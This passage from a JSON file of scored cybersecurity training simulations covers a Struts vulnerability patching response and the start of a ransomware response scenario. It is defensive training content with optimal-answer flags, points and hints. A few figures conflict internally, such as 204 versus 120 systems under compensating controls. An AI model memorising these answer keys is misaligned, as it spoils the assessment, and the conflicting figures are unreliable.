            "text": "The vulnerability has been exploited by nation-state actors",
            "feedback": "{'short': \"CVSS doesn't consider threat actors\", 'detailed': 'CVSS base scores are purely technical - they measure the characteristics of the vulnerability itself, not who is exploiting it or how actively. Threat intelligence is important context but separate from CVSS scoring. Active exploitation affects prioritization but not the CVSS number.', 'consequence': 'Misunderstanding CVSS scope could lead to incorrect vulnerability management decisions.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "CVSS measures technical characteristics of the vulnerability. What makes exploitation easiest and impact worst?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "CVSS 10.0 requires: remote network access, low complexity, no authentication, no user action, and maximum impact to CIA triad."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Prioritization Strategy",
        "situation": "You've identified 847 affected systems across production, DMZ, staging, and development environments. With limited resources and holiday shopping season approaching, you need to prioritize remediation efforts.\n\n**Question:** How should you prioritize the remediation order for these 847 systems?",
        "options": [
          {
            "id": "A",
            "text": "Remediate all systems simultaneously using automated deployment to minimize total time",
            "feedback": "{'short': 'High risk approach', 'detailed': 'Simultaneous deployment across 847 systems creates massive change management risk. If the patch causes issues, you could have widespread outages. Additionally, not all systems have the same exposure level - DMZ systems facing the internet are at higher risk than internal development machines. Prioritized waves reduce risk.', 'consequence': 'Patch causes unexpected issues, resulting in widespread service disruption during peak season.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Start with development and staging to validate patches, then production, with internet-facing systems first",
            "feedback": "{'short': 'Correct! Risk-based prioritization with validation', 'detailed': 'Proper prioritization considers both exposure and change risk: (1) Test in dev/staging first to validate patches work; (2) Prioritize by exposure - internet-facing DMZ systems are at highest risk; (3) Then internal production by business criticality. This balances security urgency with operational stability.', 'consequence': 'Patches validated before production deployment, highest-risk systems protected first, minimal business disruption.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Focus only on production systems - development and staging aren't important",
            "feedback": "{'short': 'Misses the validation opportunity', 'detailed': \"Dev/staging environments serve two critical purposes: (1) They validate that patches don't break applications before production deployment; (2) If compromised, they could provide attackers access to source code, credentials, or pivot points to production. They should be included in remediation, and dev/staging are ideal for initial patch validation.\", 'consequence': 'Untested patches deployed to production cause application failures. Compromised dev environment provides attacker foothold.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Prioritize based on system owner availability - patch whatever systems we can get approval for first",
            "feedback": "{'short': \"Doesn't address actual risk\", 'detailed': 'Availability-based prioritization ignores actual exposure and business criticality. A system owner who responds quickly might own low-risk internal systems, while critical internet-facing systems remain exposed because their owner is unavailable. Risk-based prioritization, potentially with emergency change authority, is more effective.', 'consequence': 'Low-risk systems patched while critical internet-facing systems remain vulnerable.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider both risk (which systems are most exposed) and operational safety (how to validate patches work)."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Testing in lower environments first validates patches. Then prioritize production systems by exposure level - internet-facing before internal."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "Compensating Controls Decision",
        "situation": "The business is resistant to patching the Payment Gateway servers immediately, citing 'zero tolerance for downtime' during the pre-holiday period. However, these 8 servers running Struts 2.5.30 are internet-facing and process all customer transactions.\n\n**Question:** What is the BEST approach for the Payment Gateway servers while business negotiates timing?",
        "options": [
          {
            "id": "A",
            "text": "Accept the business decision - schedule patching after the holiday season",
            "feedback": "{'short': 'Unacceptable risk - active exploitation in the wild', 'detailed': \"With CVSS 10.0, active exploitation, and internet-facing systems processing payment data, delaying patching for 6+ weeks is not a reasonable risk acceptance. This could result in a major breach, PCI-DSS violations, and regulatory penalties far exceeding any downtime costs. Security must escalate if business won't accept necessary risk reduction.\", 'consequence': 'Payment gateway compromised, customer payment data stolen, PCI-DSS breach notification required.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement WAF virtual patching rules immediately, then push for emergency maintenance window for actual patching",
            "feedback": "{'short': 'Correct! Defense in depth while pursuing proper fix', 'detailed': \"WAF virtual patching provides immediate risk reduction by blocking known exploit patterns. This buys time to negotiate an emergency maintenance window while maintaining protection. The WAF isn't perfect (can be bypassed), so it's a temporary measure while pushing for actual patching. Document the compensating control and residual risk.\", 'consequence': 'Immediate protection via WAF, documented risk position, business has time to plan minimal-impact maintenance window.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Patch the servers immediately without business approval - security overrides business concerns",
            "feedback": "{'short': 'Right instinct, wrong approach', 'detailed': 'While the security risk is real and urgent, unilateral action without any business coordination damages trust and could cause unplanned outages. Better to implement immediate compensating controls (WAF), escalate to executives with clear risk communication, and use emergency change procedures. Security and business must work together, even in emergencies.', 'consequence': 'Patches applied but cause unexpected service disruption. Security team loses credibility for future urgent requests.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Take the Payment Gateway offline until it can be patched safely",
            "feedback": "{'short': 'Disproportionate response', 'detailed': 'Taking payment processing offline would cause more business damage than most breach scenarios. Compensating controls can provide meaningful protection while maintaining service. This nuclear option should only be considered if active compromise is detected or if no compensating controls are available.', 'consequence': 'All e-commerce revenue stops. Business impact exceeds estimated breach costs.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Compensating controls can provide temporary protection while working toward the proper fix."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "WAF virtual patching can block known exploit patterns, providing immediate risk reduction while negotiating maintenance windows for actual patching."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Legacy System Challenge",
        "situation": "Your asset discovery reveals 204 systems running Apache Struts 2.3.24, which is end-of-life with no security patches available. These legacy ERP connectors handle real-time inventory synchronization. The CIO says upgrading these systems is a 'multi-million dollar, 9-month project.'\n\n**Question:** What is the appropriate approach for these unpatchable legacy systems?",
        "options": [
          {
            "id": "A",
            "text": "They're internal systems, not internet-facing, so they're low risk - focus on other priorities",
            "feedback": "{'short': \"Internal doesn't mean safe\", 'detailed': \"While not directly internet-accessible, these systems are reachable from any internal system. If an attacker gains initial access elsewhere (through phishing, another vulnerability, etc.), they could pivot to exploit these legacy systems. 'Internal' reduces but doesn't eliminate risk. With active exploitation, even internal vulnerable systems need protection.\", 'consequence': 'Attacker compromises internet-facing system, pivots internally, and exploits legacy systems to gain persistent access.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Isolate them into a restricted network segment and implement strict access controls",
            "feedback": "{'short': 'Correct! Network isolation is the key compensating control', 'detailed': \"Network segmentation is the most effective compensating control for unpatchable systems. Moving them to an isolated VLAN with firewall rules limiting connectivity to only essential systems dramatically reduces the attack surface. Combined with enhanced monitoring, this provides meaningful protection for systems that can't be patched while the longer-term upgrade project is planned.\", 'consequence': 'Legacy systems protected by network isolation. Attack surface reduced to essential connections only. Upgrade project can proceed at business pace.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Shut down the legacy systems immediately - the risk is too high to operate unpatchable systems",
            "feedback": "{'short': 'Business impact too severe without alternatives', 'detailed': 'These systems handle real-time inventory sync for e-commerce operations. Shutting them down would cripple order fulfillment. While the security risk is real, compensating controls can provide meaningful protection. Shutdown should be reserved for situations where no compensating controls are available and active compromise is detected.', 'consequence': \"Inventory sync fails, orders can't be fulfilled, massive business disruption during peak season.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Accept the risk formally with executive sign-off and enhanced monitoring",
            "feedback": "{'short': 'Risk acceptance requires compensating controls', 'detailed': \"Risk acceptance is a valid business decision, but for a CVSS 10.0 with active exploitation, formal acceptance should include compensating controls that actually reduce risk. Just monitoring doesn't prevent exploitation. Risk acceptance should document what controls ARE implemented, not just acknowledge the vulnerability exists.\", 'consequence': 'Risk is documented but not actually reduced. Monitoring detects compromise after it occurs, not preventing damage.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "When patching isn't possible, what architectural controls can reduce an attacker's ability to reach the vulnerable system?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Network segmentation limits who can reach vulnerable systems. Moving them to an isolated VLAN with strict firewall rules reduces attack surface significantly."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "Patch Testing Results",
        "situation": "Staging environment testing is complete. The Struts 6.3.1 upgrade tested clean across all 58 systems. However, the Struts 2.5.33 upgrade failed on 6 systems in the Partner Integration Hub due to custom OGNL extensions that are incompatible with the security fix.\n\n**Question:** How should you handle the Partner Integration Hub systems where the patch fails testing?",
        "options": [
          {
            "id": "A",
            "text": "Deploy the patch anyway - some functionality may break but security takes priority",
            "feedback": "{'short': 'Breaking production functionality is not acceptable', 'detailed': 'Deploying known-broken patches to production causes planned outages and erodes trust in the vulnerability management program. The Partner Integration Hub handles B2B partner transactions - breaking it would impact business relationships. Find alternative protections while the code is fixed.', 'consequence': 'Partner integration fails, B2B transactions stop, business relationships damaged.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Implement compensating controls (WAF, isolation) while development fixes the incompatible code",
            "feedback": "{'short': 'Correct! Compensating controls bridge the gap', 'detailed': \"When patches can't be deployed due to application incompatibility, implement defense-in-depth: WAF virtual patching to block exploit attempts, network controls to limit exposure, enhanced monitoring to detect compromise. Document the exception and timeline for code fixes. This maintains protection while development addresses compatibility.\", 'consequence': 'Partner Hub protected by layered controls. Development has time to fix code properly. Business operations continue.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Skip these 6 systems - 48 out of 847 is acceptable residual risk",
            "feedback": "{'short': 'Unmitigated CVSS 10.0 systems are not acceptable', 'detailed': \"You can't simply skip vulnerable systems without mitigation, especially for a CVSS 10.0 with active exploitation. Attackers only need one vulnerable system to gain a foothold. All systems need either patches or compensating controls - no exceptions can be left unprotected.\", 'consequence': 'Attackers compromise Partner Hub, pivot to internal network, expand breach.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Roll back the custom OGNL extensions in production to allow the patch to work",
            "feedback": "{'short': 'Risky without understanding impact', 'detailed': 'The custom OGNL extensions exist for a reason - they enable specific functionality. Rolling them back without understanding their purpose could break partner integrations in unexpected ways. Better to protect with compensating controls while development properly updates the code for compatibility.', 'consequence': 'Unexpected functionality breaks when extensions removed. Partner transactions fail in complex ways.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "When patches can't be deployed immediately, what controls can provide protection in the interim?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "WAF rules, network segmentation, and enhanced monitoring can protect systems while code compatibility issues are resolved."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "Change Management During Crisis",
        "situation": "Normal change management requires CAB approval which meets Tuesday and Thursday. It's Friday evening and you need to patch DMZ systems this weekend. The Change Manager says 'emergency changes still require documentation and approval chain.'\n\n**Question:** What is the appropriate change management approach for this emergency patching?",
        "options": [
          {
            "id": "A",
            "text": "Bypass change management entirely - security emergencies don't need bureaucracy",
            "feedback": "{'short': 'Dangerous precedent and potential compliance issue', 'detailed': 'Bypassing change management entirely creates audit/compliance issues (PCI-DSS requires change control) and risks uncoordinated changes causing outages. Even in emergencies, some level of documentation and approval is necessary. Most organizations have emergency change procedures for exactly these situations.', 'consequence': 'Changes made without documentation. Audit finding for PCI-DSS. No rollback plan documented.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Wait until Tuesday's CAB meeting to get proper approval before making any changes",
            "feedback": "{'short': 'Unacceptable delay for critical zero-day', 'detailed': 'CISA directive requires mitigation within 72 hours. Waiting 4 days for CAB approval violates the directive and leaves systems exposed during active exploitation. Emergency change procedures exist specifically for situations where normal timelines are inappropriate.', 'consequence': 'Systems remain vulnerable for 4 additional days. CISA directive violated. Potential exploitation during delay.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Invoke emergency change procedures - expedited approval chain with documentation",
            "feedback": "{'short': 'Correct! Emergency procedures balance speed and control', 'detailed': 'Most organizations have emergency change procedures for critical security situations: expedited approval chain (often Security + IT Director + On-call CAB member), abbreviated but documented change records, mandatory post-implementation review. This provides necessary governance while enabling rapid response.', 'consequence': 'Changes approved via emergency process. Documentation maintained. Compliance requirements met. Systems protected quickly.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Make the changes and submit change records retroactively on Monday",
            "feedback": "{'short': 'Better than nothing but not proper procedure', 'detailed': \"Retroactive documentation is better than none, but it misses the approval component and doesn't provide rollback planning before changes are made. Emergency change procedures should be pre-approved with expedited (not bypassed) approvals. Making changes then documenting creates compliance gaps.\", 'consequence': 'Changes made without approval. Retroactive documentation accepted but flagged in next audit.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Most mature organizations have emergency change procedures that provide expedited approval while maintaining documentation."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Emergency change procedures typically include: expedited approval chain, abbreviated documentation, mandatory post-implementation review, and pre-defined criteria for what qualifies as emergency."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Executive Communication",
        "situation": "The CISO requests an executive briefing for the CEO and CFO on Saturday morning. They want to understand the risk, business impact, and what resources are needed. You're helping prepare the briefing.\n\n**Question:** What should be the PRIMARY focus of the executive briefing?",
        "options": [
          {
            "id": "A",
            "text": "Technical details of the vulnerability including CVSS vector breakdown and exploitation mechanics",
            "feedback": "{'short': 'Too technical for executive audience', 'detailed': \"Executives need to understand business risk and make resource decisions, not understand CVSS vectors. Technical details like 'OGNL expression injection' mean nothing to non-technical leaders. Focus on business impact, timeline, resource needs, and decisions required.\", 'consequence': 'Executives confused by technical jargon. Key decisions delayed while they try to understand the problem.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Business risk, remediation plan, resource needs, and decisions required from leadership",
            "feedback": "{'short': 'Correct! Executive briefings need business context', 'detailed': \"Executives need: (1) Business risk - what could happen if exploited (data breach, regulatory fines, service outage); (2) Plan - what we're doing about it and timeline; (3) Resources - what we need (overtime, emergency spending); (4) Decisions - what do we need them to approve (emergency maintenance windows). Technical details only as needed to support these points.\", 'consequence': 'Executives understand risk, approve necessary resources, and support emergency change process.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Blame analysis - how this vulnerability got into our environment and who is responsible",
            "feedback": "{'short': 'Counterproductive during active incident', 'detailed': 'Blame analysis during an active incident distracts from response and creates defensive behavior. Root cause analysis and process improvement belong in post-incident review, not emergency executive briefing. Focus on solving the problem now, analyze how it happened later.', 'consequence': 'Meeting derails into finger-pointing. Response efforts stall while people defend themselves.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Detailed status of every affected system and their individual remediation timelines",
            "feedback": "{'short': 'Too much detail for executive summary', 'detailed': 'Executives need summary status (X% complete, Y systems remaining, on track for Z deadline), not system-by-system details. Detailed status belongs in operational dashboards for the technical team. Executive briefings should be strategic, not tactical.', 'consequence': \"Briefing runs long as executives wade through details they don't need. Key decisions not addressed.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What do executives need to do with the information you provide? Make decisions and allocate resources."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Executive briefings should focus on: business impact, plan summary, resource requirements, and decisions needed from leadership."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Detection and Monitoring",
        "situation": "Patching is progressing well, but you know compensating controls aren't perfect. You want to ensure that if any exploitation attempts occur, you'll detect them quickly. Your SOC Lead asks what detection priorities you recommend.\n\n**Question:** What is the MOST important detection capability for this vulnerability?",
        "options": [
          {
            "id": "A",
            "text": "Signature-based IDS/IPS rules that detect known exploit patterns",
            "feedback": "{'short': 'Important but bypassable', 'detailed': \"IDS/IPS signatures are valuable for detecting known exploit patterns, but sophisticated attackers can obfuscate payloads to evade signatures. Signatures should be part of defense-in-depth but shouldn't be the only detection method, especially for high-profile vulnerabilities where evasion techniques are quickly developed.\", 'consequence': 'Known exploits detected, but obfuscated variants bypass signature detection.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "EDR behavioral detection for post-exploitation activity (shell spawning, unusual processes)",
            "feedback": "{'short': 'Correct! Behavioral detection catches what signatures miss', 'detailed': 'EDR behavioral detection focuses on what happens AFTER successful exploitation: Java/web server processes spawning shells, unusual child processes, suspicious file writes, lateral movement attempts. These behaviors are consistent regardless of how the initial exploit is obfuscated. Combined with signature detection, this provides defense-in-depth for detection.', 'consequence': 'Even if initial exploit evades signatures, post-exploitation activity is detected quickly, enabling rapid response.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Full packet capture on all network segments for forensic analysis",
            "feedback": "{'short': 'Useful for forensics but not primary detection', 'detailed': \"Full packet capture is valuable for post-incident forensics but doesn't provide real-time detection. The volume of data makes real-time analysis impractical. PCAP should supplement other detection methods, not replace them.\", 'consequence': 'Exploitation occurs and is captured, but not detected in real-time. Only useful after compromise is discovered by other means.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Daily vulnerability scans to identify any unpatched systems",
            "feedback": "{'short': 'Useful for remediation tracking, not attack detection', 'detailed': \"Vulnerability scanning identifies vulnerable systems but doesn't detect exploitation attempts. Scanning helps ensure remediation completeness but doesn't alert you when attacks occur. Real-time detection requires different tools (IDS, EDR, SIEM).\", 'consequence': 'You know which systems are vulnerable but have no visibility into active attacks.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Consider what attackers DO after successful exploitation, not just the exploit itself."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Behavioral detection (EDR) catches post-exploitation activity like shell spawning and lateral movement, regardless of how the initial exploit was delivered."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Remediation Completion Assessment",
        "situation": "It's Monday morning. Patching has progressed well: 643 systems patched, 120 systems with compensating controls, 84 remaining. The CISO asks for your assessment of the organization's risk posture before the CISA compliance report is due.\n\n**Question:** How should you characterize the organization's current risk posture?",
        "options": [
          {
            "id": "A",
            "text": "Fully remediated - the vulnerability has been addressed across the enterprise",
            "feedback": "{'short': 'Overstates completion', 'detailed': \"84 systems remain unpatched, and 204 systems (the legacy ERP connectors) have compensating controls rather than actual patches. Claiming 'fully remediated' is inaccurate and could create compliance issues. Accuracy in risk reporting is essential.\", 'consequence': 'CISA report inaccurate. Future audit reveals incomplete remediation. Trust in security reporting damaged.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Critical risk remains - until every system is patched, the organization is vulnerable",
            "feedback": "{'short': \"Understates progress and doesn't account for controls\", 'detailed': \"While some risk remains, 90%+ systems are addressed (patched or mitigated). Compensating controls provide meaningful protection. 'Critical risk remains' doesn't reflect the significant risk reduction achieved and may cause unnecessary alarm. Risk assessment should be nuanced.\", 'consequence': \"Leadership loses confidence in security's ability to manage risk. Excessive alarm diverts resources from completing remediation.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Substantially mitigated - majority patched, remainder protected by compensating controls, defined exceptions with timelines",
            "feedback": "{'short': 'Correct! Accurate, nuanced risk assessment', 'detailed': 'Accurate risk posture: 76% patched, 14% with compensating controls, 10% in progress. Critical and high-priority systems addressed. Exceptions documented with timelines for permanent fixes. Residual risk is understood and managed. This honest assessment enables good decision-making and demonstrates mature risk management.', 'consequence': 'Accurate CISA report submitted. Leadership has clear picture of remaining work. Defined path to full remediation.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Acceptable risk - we've done enough, remaining systems are low priority",
            "feedback": "{'short': 'Premature risk acceptance', 'detailed': \"'Acceptable' implies no further action needed, but 84 systems still require patching and the Partner Integration Hub needs code fixes. Risk acceptance should be explicit decisions for specific systems with documented compensating controls and timelines, not a blanket declaration that work is done.\", 'consequence': 'Remaining remediation deprioritized. Systems stay vulnerable longer than necessary.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Risk assessment should accurately reflect current state: what's complete, what's mitigated, what remains, and what are the plans for completion."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Good risk communication includes: percentage complete, status of compensating controls, defined exceptions with timelines, and remaining work plan."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D2-SIM-003",
    "title": "The Ransomware Response",
    "domain": 2,
    "type": "SIM",
    "difficulty": "advanced",
    "time_estimate": "50-65 minutes",
    "role": "Senior Incident Responder",
    "organization": {
      "name": "Precision Manufacturing Corp",
      "industry": "Industrial Manufacturing"
    },
    "introduction": "It's 3:47 AM on Saturday when your phone explodes with alerts. The overnight NOC technician reports 'something weird' - multiple servers displaying ransom notes, file shares inaccessible, and the helpdesk voicemail filling up with panicked messages from the skeleton crew. By the time you remote in, your SIEM is showing a cascade of alerts: mass file encryption events, suspicious PowerShell execution, and lateral movement detections across multiple network segments. The attack is still active. You have critical decisions to make in the next few minutes that will determine whether this becomes a contained incident or a company-ending catastrophe.",
    "learning_objectives": [
      "Given a scenario, analyze indicators of malicious activity",
      "Explain the purpose of mitigation techniques used to secure the enterprise"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Initial Response Priority",
        "situation": "Alerts are cascading across your SIEM. You can see ransomware actively encrypting files on multiple hosts, C2 communication ongoing, and the attack spreading. Your SOC has limited overnight staff. What's your immediate priority?\n\n**Question:** What should be your FIRST action in the next 60 seconds?",
        "options": [
          {
            "id": "A",
            "text": "Begin forensic imaging of affected systems to preserve evidence",
            "feedback": "{'short': 'Evidence is important but containment comes first', 'detailed': 'Forensic preservation is important for investigation and potential law enforcement involvement, but during an ACTIVE attack with spreading encryption, containment must come first. Every minute spent on forensics while the attack continues means more systems encrypted and more data exfiltrated. Contain first, then investigate.', 'consequence': 'While imaging one system, ransomware encrypts 40 more. Attack spreads to additional network segments.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Isolate affected network segments to stop lateral movement",
            "feedback": "{'short': 'Correct! Containment is the immediate priority', 'detailed': \"During an active ransomware attack, containment is paramount. Network isolation stops lateral movement and prevents the attack from spreading to unaffected segments. This is a 'stop the bleeding' action that must happen before investigation, evidence collection, or recovery planning. You can't investigate what you haven't contained.\", 'consequence': 'East subnet isolated within 3 minutes. Attack contained to 78 systems instead of spreading to entire enterprise.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Access the ransom portal to understand the attacker's demands",
            "feedback": "{'short': 'Dangerous distraction during active attack', 'detailed': \"Accessing the ransom portal provides no immediate operational value and could have negative implications: it confirms to attackers you're aware and may start their clock, it could expose your IP, and it distracts from containment. Ransom negotiation decisions come much later, after containment and assessment.\", 'consequence': \"Time spent on portal while ransomware continues spreading. Attackers know you're engaged and may accelerate pressure.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Shut down all systems enterprise-wide to prevent further damage",
            "feedback": "{'short': 'Too broad - impacts unaffected systems unnecessarily', 'detailed': \"Enterprise-wide shutdown is a scorched earth approach that impacts systems that aren't compromised, destroys volatile forensic evidence, and causes massive business disruption. Targeted network isolation of affected segments achieves containment without destroying unaffected operations. Surgical precision over nuclear options.\", 'consequence': 'Manufacturing operations halt (OT was isolated and safe). West facility goes down unnecessarily. Evidence lost from powered-off systems.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "During an active attack, what action immediately limits the blast radius?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Network segmentation and isolation can stop lateral movement in minutes. Contain the attack to what's already affected."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "Network Isolation Strategy",
        "situation": "You've decided to isolate affected segments. Looking at your network topology, the East corporate network (10.50.0.0/16) is clearly compromised with active encryption. The West corporate network (10.60.0.0/16) has no alerts yet. The OT network is air-gapped. The datacenter hosts critical servers.\n\n**Question:** What is the optimal network isolation strategy?",
        "options": [
          {
            "id": "A",
            "text": "Isolate only the specific hosts showing ransomware alerts",
            "feedback": "{'short': 'Too narrow - attackers likely have broader access', 'detailed': \"By the time ransomware deploys, attackers typically have access to far more systems than are actively encrypting. Isolating only alerting hosts leaves other compromised (but not yet encrypting) systems connected, allowing the attack to continue from those footholds. The attacker's C2 access extends beyond visible ransomware activity.\", 'consequence': 'Isolated 14 hosts but attacker pivots from 23 other compromised systems. Encryption resumes from new locations.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Isolate the entire East subnet, protect West-to-Datacenter, verify OT isolation",
            "feedback": "{'short': 'Correct! Segment-level isolation with protection of critical assets', 'detailed': 'Isolating the entire compromised segment (East) stops all lateral movement from that zone. Protecting the path between unaffected West and the datacenter prevents spread if there are undetected footholds. Verifying OT isolation confirms manufacturing can continue. This balances containment with business continuity.', 'consequence': 'East contained completely. West and datacenter protected. Manufacturing continues. Attack limited to initial blast radius.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Disconnect all networks from the internet to stop C2 communication",
            "feedback": "{'short': 'Incomplete - internal spread continues without internet', 'detailed': \"While blocking C2 is valuable, modern ransomware operates autonomously once deployed. Disconnecting from internet stops exfiltration and C2 but doesn't stop internal lateral movement or encryption. The ransomware is already inside and will continue spreading internally. Internal segmentation is more critical.\", 'consequence': 'C2 blocked but ransomware continues encrypting internally. Attack spreads to datacenter via internal routes.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Focus isolation on protecting the OT network - manufacturing is the priority",
            "feedback": "{'short': 'OT is already protected by air-gap', 'detailed': \"The scenario states OT is air-gapped with a data diode. It's already isolated by design. Focusing on protecting what's already protected while ignoring the active spread in IT networks wastes time. Verify OT isolation is intact, but prioritize containing the active IT compromise.\", 'consequence': \"OT confirmed isolated (as it already was). Meanwhile, ransomware spreads from East to datacenter because IT segmentation wasn't addressed.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Attackers typically have broader access than visible ransomware activity shows. Think segment-level, not host-level."
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Isolate the known-compromised segment entirely, protect critical assets (datacenter) from potentially compromised areas, verify existing isolation (OT) is intact."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Identifying Patient Zero",
        "situation": "With the East network isolated, you need to understand how the attack started. Your SIEM shows the earliest alerts originated from YOURK-PC-042 at 03:31, but the encryption started across multiple systems nearly simultaneously at 03:37. This suggests pre-positioning.\n\n**Question:** What technique should you use to identify the true initial access point and timeline?",
        "options": [
          {
            "id": "A",
            "text": "Interview the user of YOURK-PC-042 to ask what they did",
            "feedback": "{'short': 'Useful but not the primary investigative method', 'detailed': 'User interviews provide context but are unreliable for precise timeline reconstruction. Users may not remember details, may be unavailable at 4 AM, or may be defensive. Technical evidence from logs and EDR provides objective, timestamped data. Interview as supplementary source, not primary.', 'consequence': 'User is asleep and unreachable. Investigation stalls waiting for interview that provides incomplete information anyway.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Review EDR telemetry and email logs to trace backward from first alert",
